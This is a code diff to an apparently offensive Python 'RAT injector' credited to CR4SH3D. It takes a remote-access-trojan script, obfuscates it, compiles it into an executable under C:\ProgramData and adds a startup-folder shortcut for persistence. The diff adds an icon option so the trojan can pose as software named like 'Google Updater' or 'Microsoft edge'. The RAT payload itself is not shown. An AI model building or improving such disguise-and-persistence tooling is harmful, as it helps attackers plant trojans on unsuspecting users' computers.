@@ -1,6 +1,3 @@
-#Using python 3.8
-#by CR4SH3D
-
 #alls os imports
 from os import system as sys
 from os import environ as env
@@ -88,11 +85,11 @@ def obf_file(base_path):
         exit()
 
 #convert file (py) to exe
-def exe(sfname):
+def exe(sfname, logopath):
     try:
         path = f'C:\\ProgramData\\{sfname}'
         rpath = r"{}".format(path)
-        sys(f'cxfreeze {sfname}.py --target-dir {rpath}')
+        sys(f'cxfreeze {sfname}.py --target-dir {rpath} --icon {logopath}')
     except:
         error("Compiler")
         exit()
@@ -114,10 +111,10 @@ def shortcut(x, app_name):
         exit()
 
 #injector main
-def injector(startup_path, base_path, sfname, r):
+def injector(startup_path, base_path, sfname, r, logopath):
     obf_file(base_path)
     rename(base_path, f"{sfname}.py")
-    exe(sfname)
+    exe(sfname, logopath)
     shortcut(startup_path, sfname)
     clear()
     Write.Print(r, Colors.red, interval=0)
@@ -137,7 +134,7 @@ def main():
     cx_freeze_checker(r)
     Write.Print(r, Colors.red, interval=0)
     Write.Print("\nby CR4SH3D © | Enjoy ;)", Colors.red, interval=0.0025)
-    
+    #file future name set
     fname = Write.Input("\n=======================\n\nEnter RAT name (Google Updater, Microsoft edge....) here ->", Colors.red, interval=0.0025)
     sfname= fname.replace(" ", "_")
 
@@ -147,10 +144,10 @@ def main():
         exit()         
     else: 
         pass
-
+    
+    #file base path set
     Write.Print("=====", Colors.red, interval=0.0025)
     path = Write.Input("\nDrag your RAT here (only .py file, no spaces in the name)->", Colors.red, interval=0.0025)
-
     try:
         if path=="":
             error("Invalid path")
@@ -160,20 +157,31 @@ def main():
     except:
         error("Set Path")
         exit()
-                                                                                         
+    
+    #logo path set 
+    Write.Print("=====", Colors.red, interval=0.0025)
+    logo = Write.Input("\nDrag your RAT logo here (only .ico file, no spaces in the name)->", Colors.red, interval=0.0025)
+    if logo == "":
+        error("Invalid Logo")
+        exit()
+    else:
+        logopath = ''.join( x for x in logo if x not in characters)
+
+    #file infos verifications before convert and inject                                                                          
     Write.Print("=====", Colors.red, interval=0.0025)
     Write.Input(f"""\nFile Infos :
 >File path: {base_path}
+>Logo Path: {logopath}
 >Final file name: {fname}
 >Final file path: C:\ProgramData\{sfname}
 >Final shortcut path: {startup_path}\{sfname}
 
 Press enter to start the injection....""", Colors.red, interval=0.0025)
-
+    #injection starter
     try:
         sys("cls")
         sys("color C")
-        injector(startup_path, base_path, sfname, r)
+        injector(startup_path, base_path, sfname, r, logopath)
     except:
         sys("cls")
         error("Fatal Error.. Pls retry")
